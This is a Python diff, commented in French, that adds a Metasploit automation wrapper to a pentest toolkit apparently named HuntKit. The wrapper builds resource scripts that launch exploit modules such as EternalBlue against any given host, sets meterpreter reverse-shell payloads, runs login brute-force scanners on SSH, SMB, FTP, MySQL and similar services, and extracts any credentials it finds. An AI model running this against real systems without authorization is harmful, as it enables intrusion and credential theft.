@@ -23,7 +23,8 @@ class HuntKitToolsManager:
             'nikto': '/usr/local/bin/nikto',
             'nuclei': '/usr/local/bin/nuclei',
             'sqlmap': '/usr/local/bin/sqlmap',
-            'msfconsole': '/opt/metasploit-framework/embedded/framework/msfconsole'
+            'msfconsole': '/usr/bin/msfconsole',
+            'msfrun': '/usr/local/bin/msfrun'
         }
         
         # Wordlists communes
@@ -33,6 +34,48 @@ class HuntKitToolsManager:
             'common_dirs': f'{self.wordlists_dir}/common.txt'
         }
     
+
+    def _find_metasploit_console(self) -> Optional[str]:
+        """Trouve msfconsole dans votre installation existante"""
+        import glob
+        
+        # Chemins possibles selon votre installation
+        possible_paths = [
+            '/opt/metasploit-framework/embedded/framework/msfconsole',  # Installation Rapid7
+            '/opt/metasploit*/msfconsole',  # Pattern générique
+            '/opt/metasploit-framework/msfconsole',  # Alternative
+            '/usr/local/bin/msfconsole',   # Installation locale
+            '/usr/bin/msfconsole'          # Installation système
+        ]
+        
+        for path_pattern in possible_paths:
+            if '*' in path_pattern:
+                # Utiliser glob pour les patterns
+                matches = glob.glob(path_pattern)
+                for match in matches:
+                    if os.path.isfile(match) and os.access(match, os.X_OK):
+                        logger.info(f"🎯 msfconsole trouvé: {match}")
+                        return match
+            else:
+                # Chemin direct
+                if os.path.isfile(path_pattern) and os.access(path_pattern, os.X_OK):
+                    logger.info(f"🎯 msfconsole trouvé: {path_pattern}")
+                    return path_pattern
+        
+        # Fallback avec which
+        try:
+            result = subprocess.run(['which', 'msfconsole'], 
+                                  capture_output=True, text=True, timeout=5)
+            if result.returncode == 0 and result.stdout.strip():
+                path = result.stdout.strip()
+                logger.info(f"🎯 msfconsole trouvé via which: {path}")
+                return path
+        except:
+            pass
+        
+        logger.warning("⚠️ msfconsole non trouvé - Metasploit peut ne pas être disponible")
+        return None
+
     def verify_tools(self) -> Dict[str, bool]:
         """Vérifie que tous les outils sont disponibles"""
         status = {}
@@ -47,6 +90,68 @@ class HuntKitToolsManager:
             if os.path.isfile(exe_file) and os.access(exe_file, os.X_OK):
                 return exe_file
         return None
+
+    
+    def get_metasploit_info(self) -> Dict[str, Any]:
+        """Informations détaillées sur l'installation Metasploit"""
+        msf_path = self.tools_paths.get('msfconsole')
+        
+        if not msf_path:
+            return {
+                'installed': False,
+                'error': 'msfconsole non trouvé',
+                'searched_paths': [
+                    '/opt/metasploit-framework/embedded/framework/msfconsole',
+                    '/opt/metasploit*/msfconsole',
+                    '/usr/local/bin/msfconsole',
+                    '/usr/bin/msfconsole'
+                ]
+            }
+        
+        try:
+            # Test de version
+            result = subprocess.run([msf_path, '-v'], 
+                                  capture_output=True, text=True, timeout=15)
+            
+            if result.returncode == 0:
+                version = result.stdout.strip()
+                installation_type = self._detect_installation_type(msf_path)
+                
+                return {
+                    'installed': True,
+                    'path': msf_path,
+                    'version': version,
+                    'installation_type': installation_type,
+                    'working': True
+                }
+            else:
+                return {
+                    'installed': True,
+                    'path': msf_path,
+                    'working': False,
+                    'error': result.stderr or 'Erreur lors du test de version'
+                }
+                
+        except Exception as e:
+            return {
+                'installed': True,
+                'path': msf_path,
+                'working': False,
+                'error': str(e)
+            }
+    
+    def _detect_installation_type(self, msf_path: str) -> str:
+        """Détecte le type d'installation Metasploit"""
+        if '/opt/metasploit-framework' in msf_path:
+            return 'rapid7_installer'  # Votre installation actuelle
+        elif '/usr/bin' in msf_path:
+            return 'package_manager'
+        elif '/usr/local' in msf_path:
+            return 'manual_install'
+        else:
+            return 'custom'
+    
+
     
     def _run_command(self, command: List[str], timeout: int = 300, input_data: str = None) -> Dict[str, Any]:
         """Exécute une commande et retourne le résultat - VERSION AMÉLIORÉE"""
@@ -583,6 +688,370 @@ class SQLMapWrapper:
         }
 
 
+# ===== NOUVEAU : WRAPPER METASPLOIT =====
+class MetasploitWrapper:
+    """Wrapper pour Metasploit Framework - Exécution non-interactive"""
+    
+    def __init__(self, tools_manager: HuntKitToolsManager):
+        self.tools = tools_manager
+        self.msf_path = '/usr/bin/msfconsole'
+        self.msfrun_path = '/usr/local/bin/msfrun'
+        
+        # Modules d'exploitation courants
+        self.common_exploits = {
+            'ssh': 'auxiliary/scanner/ssh/ssh_login',
+            'ftp': 'auxiliary/scanner/ftp/ftp_login', 
+            'smb': 'auxiliary/scanner/smb/smb_login',
+            'http': 'auxiliary/scanner/http/http_login',
+            'mysql': 'auxiliary/scanner/mysql/mysql_login',
+            'postgresql': 'auxiliary/scanner/postgres/postgres_login',
+            'telnet': 'auxiliary/scanner/telnet/telnet_login',
+            'vnc': 'auxiliary/scanner/vnc/vnc_login'
+        }
+        
+        # Payloads courants
+        self.common_payloads = {
+            'linux': 'linux/x64/meterpreter/reverse_tcp',
+            'windows': 'windows/meterpreter/reverse_tcp',
+            'php': 'php/meterpreter_reverse_tcp',
+            'java': 'java/meterpreter/reverse_tcp'
+        }
+    
+    def test_metasploit_availability(self) -> Dict[str, Any]:
+        """Teste la disponibilité de Metasploit"""
+        try:
+            # Test simple : version de msfconsole
+            result = self.tools._run_command([self.msf_path, '-v'], timeout=30)
+            
+            if result['success']:
+                version_info = result['stdout'].strip()
+                return {
+                    'available': True,
+                    'version': version_info,
+                    'path': self.msf_path
+                }
+            else:
+                return {
+                    'available': False,
+                    'error': result['stderr'],
+                    'path': self.msf_path
+                }
+                
+        except Exception as e:
+            logger.error(f"❌ Erreur test Metasploit: {e}")
+            return {
+                'available': False,
+                'error': str(e),
+                'path': self.msf_path
+            }
+    
+    def run_exploit_module(self, target: str, port: int, exploit_module: str, 
+                          options: Dict = None, timeout: int = 120) -> Dict[str, Any]:
+        """Lance un module d'exploitation Metasploit - VERSION NON-INTERACTIVE"""
+        try:
+            logger.info(f"🎯 Lancement exploit: {exploit_module} sur {target}:{port}")
+            
+            # Créer le script de commandes Metasploit
+            commands = self._build_exploit_script(target, port, exploit_module, options or {})
+            
+            # Écrire dans un fichier temporaire
+            with tempfile.NamedTemporaryFile(mode='w', suffix='.rc', delete=False) as f:
+                f.write(commands)
+                script_path = f.name
+            
+            try:
+                # Exécuter avec msfconsole en mode resource
+                command = [self.msf_path, '-q', '-r', script_path]
+                result = self.tools._run_command(command, timeout)
+                
+                # Parser le résultat
+                parsed_result = self._parse_exploit_output(result['stdout'], exploit_module)
+                
+                return {
+                    'success': True,
+                    'exploit_module': exploit_module,
+                    'target': f"{target}:{port}",
+                    'raw_output': result['stdout'],
+                    'parsed_result': parsed_result,
+                    'command_used': ' '.join(command)
+                }
+                
+            finally:
+                # Nettoyer le fichier temporaire
+                try:
+                    os.unlink(script_path)
+                except:
+                    pass
+                    
+        except Exception as e:
+            logger.error(f"❌ Erreur exploit Metasploit: {e}")
+            return {
+                'success': False,
+                'error': str(e),
+                'exploit_module': exploit_module,
+                'target': f"{target}:{port}"
+            }
+    
+    def run_auxiliary_scan(self, target: str, port: int, service: str, 
+                          options: Dict = None, timeout: int = 300) -> Dict[str, Any]:
+        """Lance un module auxiliaire (scanner) Metasploit"""
+        try:
+            # Sélectionner le module approprié selon le service
+            if service.lower() in self.common_exploits:
+                module = self.common_exploits[service.lower()]
+            else:
+                # Module générique de scan de ports
+                module = 'auxiliary/scanner/portscan/tcp'
+            
+            logger.info(f"🔍 Scan auxiliaire: {module} sur {target}:{port}")
+            
+            # Construire le script
+            commands = self._build_auxiliary_script(target, port, module, options or {})
+            
+            # Exécuter
+            with tempfile.NamedTemporaryFile(mode='w', suffix='.rc', delete=False) as f:
+                f.write(commands)
+                script_path = f.name
+            
+            try:
+                command = [self.msf_path, '-q', '-r', script_path]
+                result = self.tools._run_command(command, timeout)
+                
+                parsed_result = self._parse_auxiliary_output(result['stdout'], module)
+                
+                return {
+                    'success': True,
+                    'module': module,
+                    'target': f"{target}:{port}",
+                    'service': service,
+                    'raw_output': result['stdout'],
+                    'parsed_result': parsed_result
+                }
+                
+            finally:
+                try:
+                    os.unlink(script_path)
+                except:
+                    pass
+                    
+        except Exception as e:
+            logger.error(f"❌ Erreur scan auxiliaire: {e}")
+            return {
+                'success': False,
+                'error': str(e),
+                'target': f"{target}:{port}",
+                'service': service
+            }
+    
+    def search_exploits(self, service: str = None, platform: str = None, 
+                       cve: str = None) -> Dict[str, Any]:
+        """Recherche d'exploits dans la base Metasploit"""
+        try:
+            search_terms = []
+            
+            if service:
+                search_terms.append(f"type:exploit {service}")
+            if platform:
+                search_terms.append(f"platform:{platform}")
+            if cve:
+                search_terms.append(f"cve:{cve}")
+            
+            search_query = " ".join(search_terms) if search_terms else "type:exploit"
+            
+            # Créer le script de recherche
+            commands = f"""
+search {search_query}
+exit
+"""
+            
+            with tempfile.NamedTemporaryFile(mode='w', suffix='.rc', delete=False) as f:
+                f.write(commands)
+                script_path = f.name
+            
+            try:
+                command = [self.msf_path, '-q', '-r', script_path]
+                result = self.tools._run_command(command, timeout=60)
+                
+                exploits = self._parse_search_output(result['stdout'])
+                
+                return {
+                    'success': True,
+                    'search_query': search_query,
+                    'exploits_found': exploits,
+                    'total_results': len(exploits)
+                }
+                
+            finally:
+                try:
+                    os.unlink(script_path)
+                except:
+                    pass
+                    
+        except Exception as e:
+            logger.error(f"❌ Erreur recherche exploits: {e}")
+            return {
+                'success': False,
+                'error': str(e),
+                'search_query': search_query if 'search_query' in locals() else 'N/A'
+            }
+    
+    def _build_exploit_script(self, target: str, port: int, exploit_module: str, options: Dict) -> str:
+        """Construit un script Metasploit pour exploitation"""
+        script = f"""
+use {exploit_module}
+set RHOSTS {target}
+set RPORT {port}
+"""
+        
+        # Ajouter les options personnalisées
+        for key, value in options.items():
+            script += f"set {key.upper()} {value}\n"
+        
+        # Payload par défaut si pas spécifié
+        if 'PAYLOAD' not in [k.upper() for k in options.keys()]:
+            script += f"set PAYLOAD {self.common_payloads.get('linux', 'generic/shell_reverse_tcp')}\n"
+        
+        # LHOST par défaut
+        if 'LHOST' not in [k.upper() for k in options.keys()]:
+            script += "set LHOST 127.0.0.1\n"
+        
+        # LPORT par défaut  
+        if 'LPORT' not in [k.upper() for k in options.keys()]:
+            script += "set LPORT 4444\n"
+        
+        script += """
+check
+exploit -z
+exit
+"""
+        return script
+    
+    def _build_auxiliary_script(self, target: str, port: int, module: str, options: Dict) -> str:
+        """Construit un script pour modules auxiliaires"""
+        script = f"""
+use {module}
+set RHOSTS {target}
+set RPORT {port}
+"""
+        
+        # Options communes pour scanners
+        script += "set THREADS 10\n"
+        script += "set VERBOSE true\n"
+        
+        # Ajouter les options personnalisées
+        for key, value in options.items():
+            script += f"set {key.upper()} {value}\n"
+        
+        script += """
+run
+exit
+"""
+        return script
+    
+    def _parse_exploit_output(self, output: str, module: str) -> Dict[str, Any]:
+        """Parse la sortie d'un exploit Metasploit"""
+        result = {
+            'exploit_attempted': True,
+            'sessions_opened': 0,
+            'vulnerabilities_found': [],
+            'errors': [],
+            'status': 'unknown'
+        }
+        
+        lines = output.split('\n')
+        
+        for line in lines:
+            line_lower = line.lower()
+            
+            # Détection de sessions ouvertes
+            if 'session' in line_lower and ('opened' in line_lower or 'created' in line_lower):
+                result['sessions_opened'] += 1
+                result['status'] = 'exploited'
+            
+            # Détection de vulnérabilités
+            if any(keyword in line_lower for keyword in ['vulnerable', 'exploit completed', 'shell opened']):
+                result['vulnerabilities_found'].append(line.strip())
+                result['status'] = 'vulnerable'
+            
+            # Détection d'erreurs
+            if any(keyword in line_lower for keyword in ['error', 'failed', 'unable to']):
+                result['errors'].append(line.strip())
+            
+            # Détection d'échec d'exploitation
+            if any(keyword in line_lower for keyword in ['exploit failed', 'not vulnerable', 'target is not']):
+                result['status'] = 'not_vulnerable'
+        
+        # Statut par défaut si pas de sessions mais pas d'erreurs
+        if result['status'] == 'unknown' and not result['errors']:
+            result['status'] = 'completed'
+        
+        return result
+    
+    def _parse_auxiliary_output(self, output: str, module: str) -> Dict[str, Any]:
+        """Parse la sortie d'un module auxiliaire"""
+        result = {
+            'scan_completed': True,
+            'credentials_found': [],
+            'hosts_discovered': [],
+            'vulnerabilities': [],
+            'errors': []
+        }
+        
+        lines = output.split('\n')
+        
+        for line in lines:
+            line_lower = line.lower()
+            
+            # Détection de credentials
+            if any(keyword in line_lower for keyword in ['login successful', 'valid credentials', 'success:']):
+                # Extraire les credentials si possible
+                cred_match = re.search(r'(\w+):(\w+)', line)
+                if cred_match:
+                    result['credentials_found'].append({
+                        'username': cred_match.group(1),
+                        'password': cred_match.group(2),
+                        'service': module.split('/')[-1] if '/' in module else 'unknown'
+                    })
+            
+            # Détection d'hôtes
+            if 'responding' in line_lower or 'alive' in line_lower:
+                host_match = re.search(r'(\d+\.\d+\.\d+\.\d+)', line)
+                if host_match:
+                    result['hosts_discovered'].append(host_match.group(1))
+            
+            # Erreurs
+            if any(keyword in line_lower for keyword in ['error', 'failed', 'timeout']):
+                result['errors'].append(line.strip())
+        
+        return result
+    
+    def _parse_search_output(self, output: str) -> List[Dict[str, str]]:
+        """Parse la sortie d'une recherche d'exploits"""
+        exploits = []
+        lines = output.split('\n')
+        
+        for line in lines:
+            # Format typique: "   0  exploit/windows/smb/ms17_010_eternalblue  MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption"
+            exploit_match = re.match(r'\s*\d+\s+(exploit/[^\s]+)\s+(.+)', line)
+            if exploit_match:
+                exploits.append({
+                    'module': exploit_match.group(1),
+                    'description': exploit_match.group(2).strip(),
+                    'type': 'exploit'
+                })
+            
+            # Format pour auxiliaires
+            aux_match = re.match(r'\s*\d+\s+(auxiliary/[^\s]+)\s+(.+)', line)
+            if aux_match:
+                exploits.append({
+                    'module': aux_match.group(1),
+                    'description': aux_match.group(2).strip(),
+                    'type': 'auxiliary'
+                })
+        
+        return exploits
+
+
 # ===== CLASSE PRINCIPALE =====
 class HuntKitIntegration:
     """Intégration principale pour utiliser HuntKit avec Celery - VERSION COMPLÈTE CORRIGÉE"""
@@ -594,14 +1063,22 @@ class HuntKitIntegration:
         self.nikto = NiktoWrapper(self.tools_manager)
         self.nuclei = NucleiWrapper(self.tools_manager)
         self.sqlmap = SQLMapWrapper(self.tools_manager)
+        self.metasploit = MetasploitWrapper(self.tools_manager)
     
     def get_tool_status(self) -> Dict[str, Any]:
         """Retourne le statut de tous les outils"""
+        tools_status = self.tools_manager.verify_tools()
+        
+        # Test spécial pour Metasploit
+        msf_test = self.metasploit.test_metasploit_availability()
+        tools_status['metasploit_detailed'] = msf_test
+        
         return {
-            'tools_available': self.tools_manager.verify_tools(),
+            'tools_available': tools_status,
             'wordlists': self.tools_manager.wordlists,
             'tools_dir': self.tools_manager.tools_dir,
-            'initialized_at': datetime.now().isoformat()
+            'initialized_at': datetime.now().isoformat(),
+            'metasploit_info': msf_test
         }
     
     def run_discovery(self, target: str) -> Dict[str, Any]:
@@ -720,3 +1197,91 @@ class HuntKitIntegration:
             'result': result,
             'credentials_found': result.get('parsed', {}).get('credentials_found', [])
         }
+
+    def run_exploitation(self, target: str, port: int = None, service: str = None, 
+                        exploit_module: str = None, options: Dict = None) -> Dict[str, Any]:
+        """Lance une exploitation avec Metasploit - NOUVELLE FONCTION"""
+        logger.info(f"🎯 Début exploitation: {target}")
+        
+        start_time = time.time()
+        
+        try:
+            # Si aucun module spécifié, essayer de deviner selon le service
+            if not exploit_module and service:
+                if service.lower() == 'ssh':
+                    exploit_module = 'auxiliary/scanner/ssh/ssh_login'
+                elif service.lower() == 'smb':
+                    exploit_module = 'exploit/windows/smb/ms17_010_eternalblue'
+                elif service.lower() == 'http':
+                    exploit_module = 'auxiliary/scanner/http/http_login'
+                else:
+                    # Module auxiliaire générique
+                    exploit_module = f'auxiliary/scanner/{service}/{service}_login'
+            
+            # Port par défaut selon le service
+            if not port and service:
+                port_mapping = {
+                    'ssh': 22, 'ftp': 21, 'telnet': 23, 'smtp': 25,
+                    'http': 80, 'https': 443, 'smb': 445, 'mysql': 3306
+                }
+                port = port_mapping.get(service.lower(), 80)
+            
+            # Lancer l'exploitation
+            if exploit_module.startswith('auxiliary/'):
+                result = self.metasploit.run_auxiliary_scan(
+                    target, port or 80, service or 'unknown', options
+                )
+            else:
+                result = self.metasploit.run_exploit_module(
+                    target, port or 80, exploit_module, options
+                )
+            
+            duration = int(time.time() - start_time)
+            
+            return {
+                'success': result['success'],
+                'target': target,
+                'port': port,
+                'service': service,
+                'exploit_module': exploit_module,
+                'duration': duration,
+                'result': result,
+                'summary': self._create_exploitation_summary(result),
+                'timestamp': datetime.now().isoformat()
+            }
+            
+        except Exception as e:
+            duration = int(time.time() - start_time)
+            logger.error(f"❌ Erreur exploitation: {e}")
+            
+            return {
+                'success': False,
+                'target': target,
+                'error': str(e),
+                'duration': duration,
+                'timestamp': datetime.now().isoformat()
+            }
+
+
+    def _create_exploitation_summary(self, result: Dict) -> str:
+        """Crée un résumé lisible des résultats d'exploitation"""
+        if not result.get('success'):
+            return f"Échec de l'exploitation: {result.get('error', 'Erreur inconnue')}"
+        
+        parsed = result.get('parsed_result', {})
+        
+        if parsed.get('sessions_opened', 0) > 0:
+            return f"✅ Exploitation réussie ! {parsed['sessions_opened']} session(s) ouverte(s)"
+        
+        if parsed.get('credentials_found'):
+            creds_count = len(parsed['credentials_found'])
+            return f"🔑 {creds_count} credential(s) découvert(s)"
+        
+        if parsed.get('vulnerabilities_found'):
+            vuln_count = len(parsed['vulnerabilities_found'])
+            return f"⚠️ {vuln_count} vulnérabilité(s) détectée(s)"
+        
+        if parsed.get('status') == 'not_vulnerable':
+            return "✅ Cible non vulnérable à ce module"
+        
+        return "ℹ️ Exploitation terminée - voir détails"
